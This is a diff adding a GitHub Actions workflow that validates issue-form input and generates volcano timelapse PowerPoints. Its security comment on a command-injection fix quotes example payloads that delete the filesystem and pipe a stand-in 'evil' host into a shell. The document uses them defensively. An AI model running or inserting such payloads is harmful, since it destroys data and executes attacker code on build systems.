@@ -1,0 +1,211 @@
+name: PPT Individual via Issue
+
+# Serializa con los workflows que pushean a main (no pisar el push del cron/watcher).
+concurrency:
+  group: push-main
+  cancel-in-progress: false
+
+on:
+  issues:
+    types: [opened]
+
+permissions:
+  contents: write
+  issues: write
+
+# ============================================================================
+# SEGURIDAD (FIX 2026-06-14): INYECCION DE COMANDOS
+# ----------------------------------------------------------------------------
+# El cuerpo del issue (github.event.issue.body) lo controla CUALQUIERA en un
+# repo publico. Antes se interpolaba con ${{ }} directamente dentro de los
+# `run:` (git commit -m, gh issue comment, echo >> $GITHUB_OUTPUT...). La
+# expansion ${{ }} ocurre ANTES de que corra el shell, asi que un body como
+#   "; rm -rf / #   o   $(curl evil|sh)
+# se convertia en shell literal => ejecucion remota de comandos.
+#
+# Mitigaciones aplicadas:
+#   (a) Todo dato derivado del issue viaja por env: (ISSUE_BODY, VOLCAN, FECHA*,
+#       ISSUE_NUMBER), NUNCA con ${{ }} dentro del cuerpo de un `run:`.
+#   (b) En el shell se referencia "$VAR" (que viene de env, no de la expresion).
+#   (c) VOLCAN se valida contra lista cerrada de caracteres ^[A-Za-z0-9 _-]+$.
+#   (d) FECHA_INICIO / FECHA_FIN se validan contra ^[0-9]{4}-[0-9]{2}-[0-9]{2}$.
+#   (e) Si algo no valida -> valido=false, se comenta el error y se cierra el
+#       issue, sin ejecutar nada mas.
+# ============================================================================
+
+jobs:
+  generar-ppt:
+    # Solo procesar issues con el label ppt-request
+    if: contains(github.event.issue.labels.*.name, 'ppt-request')
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v5
+
+      - name: Parsear y validar datos del issue
+        id: parsear
+        env:
+          # ISSUE_BODY viene por env, NUNCA interpolado con ${{ }} en el shell.
+          ISSUE_BODY: ${{ github.event.issue.body }}
+        run: |
+          # Extraer campos del formulario de GitHub Issues
+          VOLCAN=$(echo "$ISSUE_BODY" | grep -A1 "### Volcán" | tail -1 | xargs)
+          FECHA_INICIO=$(echo "$ISSUE_BODY" | grep -A1 "### Fecha inicio" | tail -1 | xargs)
+          FECHA_FIN=$(echo "$ISSUE_BODY" | grep -A1 "### Fecha fin" | tail -1 | xargs)
+
+          VALIDO=true
+          MOTIVO=""
+
+          # --- Validacion VOLCAN: lista cerrada de caracteres (sin ; $ ` ( ) " ' \n) ---
+          if [ -z "$VOLCAN" ]; then
+            VALIDO=false
+            MOTIVO="Falta el campo Volcán."
+          elif ! printf '%s' "$VOLCAN" | grep -qE '^[A-Za-z0-9 _-]+$'; then
+            VALIDO=false
+            MOTIVO="El nombre del volcán contiene caracteres no permitidos (solo letras, números, espacio, guión y guión bajo)."
+          fi
+
+          # --- Validacion FECHAS: formato estricto YYYY-MM-DD ---
+          if [ "$VALIDO" = "true" ]; then
+            if ! printf '%s' "$FECHA_INICIO" | grep -qE '^[0-9]{4}-[0-9]{2}-[0-9]{2}$'; then
+              VALIDO=false
+              MOTIVO="Fecha inicio inválida (formato esperado YYYY-MM-DD)."
+            elif ! printf '%s' "$FECHA_FIN" | grep -qE '^[0-9]{4}-[0-9]{2}-[0-9]{2}$'; then
+              VALIDO=false
+              MOTIVO="Fecha fin inválida (formato esperado YYYY-MM-DD)."
+            fi
+          fi
+
+          # Escribir outputs SOLO con valores ya validados.
+          {
+            echo "valido=$VALIDO"
+            echo "motivo=$MOTIVO"
+            if [ "$VALIDO" = "true" ]; then
+              echo "volcan=$VOLCAN"
+              echo "fecha_inicio=$FECHA_INICIO"
+              echo "fecha_fin=$FECHA_FIN"
+            fi
+          } >> "$GITHUB_OUTPUT"
+
+          echo "Validacion: valido=$VALIDO motivo=$MOTIVO"
+
+      - name: Comentar inicio
+        if: steps.parsear.outputs.valido == 'true'
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Todo por env, referenciado como "$VAR" en el shell. Nunca ${{ }} inline.
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          VOLCAN: ${{ steps.parsear.outputs.volcan }}
+          FECHA_INICIO: ${{ steps.parsear.outputs.fecha_inicio }}
+          FECHA_FIN: ${{ steps.parsear.outputs.fecha_fin }}
+        run: |
+          gh issue comment "$ISSUE_NUMBER" --body "$(cat <<EOF
+          **Generando PPT...**
+          - Volcán: $VOLCAN
+          - Período: $FECHA_INICIO → $FECHA_FIN
+
+          Tiempo estimado: 3-5 minutos.
+          EOF
+          )"
+
+      - name: Comentar error de validacion
+        if: steps.parsear.outputs.valido == 'false'
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          MOTIVO: ${{ steps.parsear.outputs.motivo }}
+        run: |
+          gh issue comment "$ISSUE_NUMBER" --body "$(cat <<EOF
+          No se pudo procesar la solicitud: $MOTIVO
+
+          Asegurate de usar el template correcto. El nombre del volcán solo puede
+          contener letras, números, espacios, guiones y guiones bajos; las fechas
+          deben tener formato YYYY-MM-DD.
+          EOF
+          )"
+          gh issue close "$ISSUE_NUMBER"
+
+      - name: Setup Python
+        if: steps.parsear.outputs.valido == 'true'
+        uses: actions/setup-python@v6
+        with:
+          python-version: '3.10'
+
+      - name: Instalar dependencias
+        if: steps.parsear.outputs.valido == 'true'
+        run: pip install python-pptx Pillow requests numpy
+
+      - name: Generar timelapse
+        if: steps.parsear.outputs.valido == 'true'
+        env:
+          VOLCAN: ${{ steps.parsear.outputs.volcan }}
+          FECHA_INICIO: ${{ steps.parsear.outputs.fecha_inicio }}
+          FECHA_FIN: ${{ steps.parsear.outputs.fecha_fin }}
+        run: python timelapse_generator.py
+
+      - name: Generar PPT
+        if: steps.parsear.outputs.valido == 'true'
+        env:
+          VOLCAN: ${{ steps.parsear.outputs.volcan }}
+          FECHA_INICIO: ${{ steps.parsear.outputs.fecha_inicio }}
+          FECHA_FIN: ${{ steps.parsear.outputs.fecha_fin }}
+        run: python ppt_generator.py
+
+      - name: Publicar PPT como release temporal y comentar link
+        if: steps.parsear.outputs.valido == 'true'
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          REPO: ${{ github.repository }}
+          VOLCAN: ${{ steps.parsear.outputs.volcan }}
+          FECHA_INICIO: ${{ steps.parsear.outputs.fecha_inicio }}
+          FECHA_FIN: ${{ steps.parsear.outputs.fecha_fin }}
+        run: |
+          PPT_FILE=$(find docs/sentinel2 -name "*.pptx" -newer docs/plantillas/Cambios_morfologicos.pptx | head -1)
+
+          if [ -z "$PPT_FILE" ]; then
+            gh issue comment "$ISSUE_NUMBER" \
+              --body "No se generó el PPT. Puede que no haya imágenes disponibles para ese período."
+            gh issue close "$ISSUE_NUMBER"
+            exit 0
+          fi
+
+          TAG="ppt-issue-$ISSUE_NUMBER"
+
+          # Borrar release anterior del mismo issue si existe
+          gh release delete "$TAG" --yes 2>/dev/null || true
+
+          # VOLCAN y FECHA* ya validados (regex) -> seguros para --title.
+          gh release create "$TAG" "$PPT_FILE" \
+            --title "PPT $VOLCAN — $FECHA_INICIO → $FECHA_FIN" \
+            --notes "Generado automáticamente por solicitud #$ISSUE_NUMBER" \
+            --latest=false
+
+          DOWNLOAD_URL="https://github.com/$REPO/releases/download/$TAG/$(basename "$PPT_FILE")"
+
+          gh issue comment "$ISSUE_NUMBER" --body "$(cat <<EOF
+          **PPT generado exitosamente.**
+
+          **Descarga directa:** $DOWNLOAD_URL
+
+          > El archivo estará disponible por 30 días.
+          EOF
+          )"
+
+          gh issue close "$ISSUE_NUMBER" --comment "Solicitud completada."
+
+      - name: Commit GIFs generados
+        if: steps.parsear.outputs.valido == 'true'
+        env:
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          VOLCAN: ${{ steps.parsear.outputs.volcan }}
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+          git add docs/sentinel2/
+          git diff --cached --quiet && exit 0
+          # VOLCAN viene por env y esta validado; -m "$VAR" no interpola shell.
+          git commit -m "PPT Issue #$ISSUE_NUMBER: $VOLCAN"
+          git pull --rebase origin main
+          git push origin main
